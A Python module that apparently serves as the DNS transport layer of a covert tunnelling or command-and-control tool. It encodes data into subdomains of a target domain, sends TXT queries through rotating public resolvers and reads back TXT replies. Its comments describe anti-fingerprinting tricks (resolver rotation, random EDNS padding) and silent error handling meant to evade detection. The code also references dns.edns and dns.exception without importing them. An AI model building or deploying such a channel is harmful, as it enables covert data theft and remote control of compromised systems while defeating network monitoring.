# lib/transport/dns.py
import dns.resolver
import dns.message
import dns.query
import dns.rdatatype
import random
import threading


# Resolver pool and rotation
_resolver_pool = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9']
_resolver_index = 0
_resolver_lock = threading.Lock()


def _get_next_resolver():
    """Thread-safe round-robin resolver selection."""
    global _resolver_index
    with _resolver_lock:
        resolver = _resolver_pool[_resolver_index % len(_resolver_pool)]
        _resolver_index += 1
        return resolver


def send_dns_query(data: bytes, target: str):
    """
    Send DNS TXT query with improved reliability and anti-fingerprinting.
    
    Enhancements:
    - Resolver rotation (defeats single-resolver fingerprinting)
    - Optimized timeout (3s instead of 5s for faster response)
    - Random EDNS padding (30% chance, defeats size fingerprinting)
    - Retry logic with fallback
    - Silent error handling
    """
    subdomain = data.decode('ascii') if isinstance(data, bytes) else data
    query_domain = f"{subdomain}.{target}"
    
    # Determine DNS server based on target
    if target.endswith('.local') or target == 'localhost' or 'localhost' in target:
        dns_server = '127.0.0.1'
        dns_port = 53
        timeout = 5  # Local can be slower
    else:
        # Production: rotate through resolver pool
        dns_server = _get_next_resolver()
        dns_port = 53
        timeout = 3  # Optimized: 3s is sufficient for most networks
    
    # Attempt query with retry
    max_attempts = 2
    for attempt in range(max_attempts):
        try:
            # Create DNS query
            query = dns.message.make_query(query_domain, dns.rdatatype.TXT)
            
            # Add random EDNS padding (defeats size-based fingerprinting)
            # 30% chance to add padding, varies packet size
            if random.random() < 0.3:
                padding_size = random.randint(10, 100)
                # EDNS0 with padding option
                query.use_edns(edns=0, payload=4096, 
                              options=[dns.edns.GenericOption(12, b'\x00' * padding_size)])
            
            # Send query with timeout
            response = dns.query.udp(query, dns_server, port=dns_port, timeout=timeout)
            
            # Extract TXT records
            responses = []
            for answer in response.answer:
                for item in answer:
                    if item.rdtype == dns.rdatatype.TXT:
                        txt_data = b''.join(item.strings).decode('ascii', errors='ignore')
                        responses.append(txt_data)
            
            # Success - return results
            if responses or attempt == max_attempts - 1:
                return responses
                
        except dns.exception.Timeout:
            # Timeout - try next resolver if available
            if attempt < max_attempts - 1 and not (target.endswith('.local') or 'localhost' in target):
                dns_server = _get_next_resolver()
                continue
            return []
            
        except Exception:
            # Any other error - fail silently
            if attempt < max_attempts - 1:
                continue
            return []
    
    return []
